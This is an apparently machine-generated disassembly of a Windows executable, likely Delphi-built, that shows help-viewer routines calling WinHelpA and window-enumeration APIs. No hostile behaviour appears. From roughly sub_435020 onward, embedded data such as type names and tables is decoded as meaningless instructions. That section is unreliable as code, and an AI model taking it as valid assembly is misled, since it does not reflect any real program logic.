xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43475a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4344ac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_434760
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434858
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_4344ac
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408da0
mov eax ebx
call sub_434df0
test al al
je r-xdata
mov ecx sub_434300
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43485f
lea eax [ ebp - 0x1c ]
call sub_403ee8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_4344ac
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_434d48
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f3c
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4043a8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4348c8
push ebx
mov ebx eax
mov eax ebx
call sub_4348ac
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405634
pop ebx
retn
mov eax rw-data
call sub_405634
sub_4348f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_434950
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434957
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4344ac
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_434960
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434a56
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408d60
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4344ac
mov eax ebx
call sub_434df0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434a5d
lea eax [ ebp - 0x110 ]
call sub_403ee8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404158
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_434d48
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404158
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_434a74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_434ad6
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434add
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4344ac
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_434ae8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434b68
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4344ac
mov eax ebx
call sub_434df0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434b6f
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_434d48
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_434b78
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_434c63
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_434df0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434c6a
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f0c
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407f38
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_434d48
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407f38
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403f3c
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4344ac
mov eax [ ebp - 0x14 ]
call sub_4043a8
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_434c78
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4087c4
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_434cd3
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4087a0
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_434d48
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404398
xor eax eax
push ebp
push sub_434dbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_434d2c
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434dc5
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407c60
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_434dd4
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_434df0
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_434d2c
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_434dd0
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_434dd4
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_434e4c
sub_434e4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_434ec9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4348ac
call GetTickCount
mov ebx eax
push 0x0
call sub_406170
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4344ac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434ed0
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_434ed8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4034bc
call sub_40564c
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_434f20
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_434f4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434fba
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434fc1
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405634
mov eax rw-data
call sub_405634
mov eax rw-data
call sub_405634
mov eax rw-data
call sub_403ee8
mov eax rw-data
call sub_405634
mov eax [ rw-data ]
call sub_43457c
sub_434fc4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_435016
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43501d
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_434ed8
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405634
mov edx eax
mov eax [ rw-data ]
call sub_425254
sub_435020
and al 0x50
inc ebx
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
cld
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
add [ ebx ] cl
push esp
inc esp
jb r-xdata
nop
inc eax
push eax
inc ebx
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc eax
add ah bh
push eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + eax ] dh
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor eax [ eax ]
pop esp
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ecx + 0x43 ] dl
jae r-xdata
inc ebx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + esi + 0x51 ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 8 + 0x50 ] si
inc ebx
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
dec edi
add [ ebx + edi * 2 + 0x43 ] cl
add ah dh
xor eax [ eax ]
call 0x30439124
xor [ eax ] eax
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
push ecx
inc ebx
jb r-xdata
inc ebx
add [ edi ] al
push ss
add al bl
jpe r-xdata
add ah bh
jpe r-xdata
outsd
outsb
je r-xdata
add al bl
jns r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
pop eax
push eax
inc ebx
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax + edx * 2 + 0x43 ] dl
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
call 0x3043928c
xor [ eax ] eax
dec esp
xor [ eax ] eax
mov [ ecx ] dh
inc eax
add al ch
inc esp
push esp
inc edx
popad
jae r-xdata
add ah dl
jpe r-xdata
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ ebx + edi * 2 + 0x7b6c0043 ] bh
add [ ebx + 0x4351a0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
push ecx
inc ebx
add [ eax + eax ] bh
add [ eax ] al
mov al 0x50
inc ebx
add al ah
xor eax [ eax ]
pop esp
jpo r-xdata
insb
jae r-xdata
add [ ecx + edi * 2 ] bh
inc ebx
add [ ecx + edi * 2 + 0x7af00043 ] bl
inc ebx
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 ] bl
jpo r-xdata
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax - 0x17ffbfcf ] cl
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
inc esp
add al bl
jns r-xdata
inc ebx
outsd
insb
jae r-xdata
add [ eax + 0x40004352 ] dl
add [ eax ] al
add [ ecx + edx * 2 + 0x43 ] dl
inc esp
jb r-xdata
inc ebx
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
add [ ebx + edi * 2 + 0x43 ] cl
add ah dh
xor eax [ eax ]
call 0x304391c8
xor [ eax ] eax
dec esp
xor [ eax ] eax
mov [ ecx ] dh
inc eax
add al ch
jpo r-xdata
add [ eax ] al
add [ eax ] al
jpe r-xdata
add ah bh
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor [ eax ] eax
mov [ ecx ] dh
inc eax
add [ ecx + edi * 2 + 0x7ad80043 ] dl
inc ebx
add ah dl
jpe r-xdata
outsd
insd
inc ebx
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
add [ eax - 0xbffbc84 ] al
xor eax [ eax ]
call 0x30439318
xor [ eax ] eax
dec esp
xor [ eax ] eax
mov [ ecx ] dh
inc eax
add al ch
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x63ffbc85 ] dl
jns r-xdata
inc ebx
add [ esp + edi * 2 ] dh
inc ebx
add al bl
jns r-xdata
outsd
insb
add [ eax - 0x63ffbc85 ] dl
jns r-xdata
inc ebx
add [ esp + edi * 2 ] dh
inc ebx
add al bl
jns r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ ebp + 0x52640040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ edx ] dl
push esp
add [ ebx + edi * 2 + 0x43 ] cl
add al ah
xor eax [ eax ]
pop esp
jpo r-xdata
add [ eax ] al
nop
push edx
inc ebx
add [ eax ] al
add [ eax ] al
push esp
push ecx
inc ebx
inc ebx
outsd
outsb
je r-xdata
je r-xdata
inc ebx
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 + 0x700043 ] bh
add [ eax ] al
push esp
push ecx
inc ebx
add [ esp + edi * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x53
add [ eax + 0x7c ] al
inc ebx
add ah dh
jpe r-xdata
dec edi
bound ebp [ edx + 0x65 ]
add al dh
jpe r-xdata
add al ah
xor eax [ eax ]
pop esp
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x63ffbc85 ] dl
jns r-xdata
jpe r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
sbb [ edx + 0x43 ] dl
add al ah
xor eax [ eax ]
pop esp
jpo r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x10 ] si
push edx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] bl
jpo r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x18 ] si
push ecx
inc ebx
add al dh
jpe r-xdata
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
add al bl
jns r-xdata
jpe r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
adc [ ebx + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ ebp + edi * 2 + 0x7e380043 ] bh
inc ebx
add [ ebx + edi * 2 + 0x43 ] cl
add ah dh
xor eax [ eax ]
call 0x304393a8
xor [ eax ] eax
dec esp
xor [ eax ] eax
call 0xffffffffe84396fd
jpo r-xdata
add [ eax + 0x7c ] ah
inc ebx
add [ ebx + edi * 2 + 0x7b6c0043 ] bh
arpl [ eax + 0x51 ] si
add ah dh
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7c ] al
inc ebx
add ah dh
add [ eax ] al
mov esp 0x70004353
add [ eax ] al
add [ ecx + edx * 2 + 0x43 ] dl
add [ eax + 0x7c ] ah
inc ebx
add [ ebx + edi * 2 + 0x7b6c0043 ] bh
inc esp
jb r-xdata
add ah dh
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add ah dh
jpe r-xdata
add ah bh
jpe r-xdata
outsd
insb
jae r-xdata
push esp
inc esp
jb r-xdata
add [ eax ] bl
jge r-xdata
inc ebx
add ah ah
arpl [ gs : eax + eax * 4 + 0x53 ] si
add ah dh
jpe r-xdata
inc ebx
add al ah
xor eax [ eax ]
pop esp
jpo r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 8 + 0x53 ] si
dec edi
add [ eax + 0x7e ] ah
inc ebx
add ah dl
jpe r-xdata
inc ebx
add [ ecx + edx * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
add [ ebp + edi * 2 + 0x43 ] dh
add [ esp + edi * 2 + 0x7dbc0043 ] al
inc ebx
add [ eax ] bh
jle r-xdata
add [ ebx + 0x435444c0 ] cl
add [ eax ] dh
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 4 + 0x53 ] si
add [ ecx + edi * 2 + 0x7af00043 ] bl
inc ebx
push ebx
add ah bh
jpe r-xdata
inc ebx
add [ ebp + edi * 2 + 0x7e380043 ] bh
inc ebx
xor [ eax ] eax
dec esp
xor [ eax ] eax
call 0xffffffffe84397c1
jpo r-xdata
add [ esi + edi * 2 + 0x43 ] dh
add ah dh
xor eax [ eax ]
call 0x3043946c
inc ecx
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
add [ eax ] al
sbb al 0xb8
add [ esi + edi * 2 + 0x43 ] cl
add [ esi + edi * 2 + 0x43 ] ch
add [ ecx ] dl
push esp
inc esp
jb r-xdata
dec edi
add [ eax + 0x7e ] ah
inc ebx
add ah dl
jpe r-xdata
push ecx
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ ebp + edi * 2 + 0x43 ] dh
add [ esp + edi * 2 + 0x7dbc0043 ] al
inc ebx
add [ eax ] bh
jle r-xdata
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
inc esp
outsd
arpl [ ebx + 0x4f ] bp
add [ esi + ebx * 8 - 0x2157ffbf ] bh
inc ecx
add [ eax - 0x70 ] dh
inc ebx
add [ esi ] cl
push esp
inc ebx
outsd
outsb
inc ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx * 2 + 0x43 ] cl
mov eax eax
loopne r-xdata
add al bl
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70004354 ] al
add [ eax ] al
add [ ebx + edx * 2 ] dh
mov eax eax
inc esp
push esp
inc ebx
add [ esi + edi * 2 + 0x43 ] cl
add [ esi + edi * 2 + 0x43 ] ch
add [ edi ] cl
push esp
inc esp
jb r-xdata
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ edx - 0x6d4bffbf ] ch
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] bl
jge r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x43561490
add [ ebx ] al
or al 0x54
add al dh
xor eax [ eax ]
hlt
jae r-xdata
push esp
inc ebx
add [ eax + eax ] ah
add [ eax + edi * 4 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x55
add [ ecx + edi * 2 + 0x7af00043 ] bl
inc ebx
add ah dh
jpe r-xdata
add al bl
outsd
insd
popad
je r-xdata
inc ebx
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add [ eax ] al
or al 0x55
inc ebx
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc eax
add [ eax + 0x6004357 ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc ebx
add [ ebx ] dl
inc ecx
add [ eax + 0x64004395 ] al
mov [ 0xffffffffa2f80041 ] al
inc ecx
add [ ebx + 0x41 ] cl
inc ecx
add ah dl
xchg esp eax
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
xchg ecx eax
inc ebx
add [ edi + edx * 2 ] esi
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + edx * 2 + 0x640b0043 ] cl
jae r-xdata
adc [ edi + 0x43 ] dl
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
push esi
inc ebx
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
inc ebx
add al ah
mov [ 0xffffffff94d40041 ] al
lodsb [ esi ]
mov [ 0xffffffff92b40041 ] al
jae r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
push esi
inc ebx
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
push esp
rcl [ eax + 0x3004356 ] 0xa
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
je r-xdata
push esp
inc ebx
add [ eax + 0x40041b8 ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
adc al 0x92
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
adc al 0x92
inc ebx
inc ebx
outsd
outsb
jae r-xdata
add [ eax + 0x47 ] al
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add [ eax - 0x6fffbc6e ] ah
xchg ecx eax
inc ebx
add [ eax ] dl
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc eax
add al dh
xor eax [ eax ]
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
add al al
xchg ebx eax
inc ebx
add [ edx + ebp * 2 - 0x6bcbffbc ] dh
inc ebx
add ah bl
push 0x44
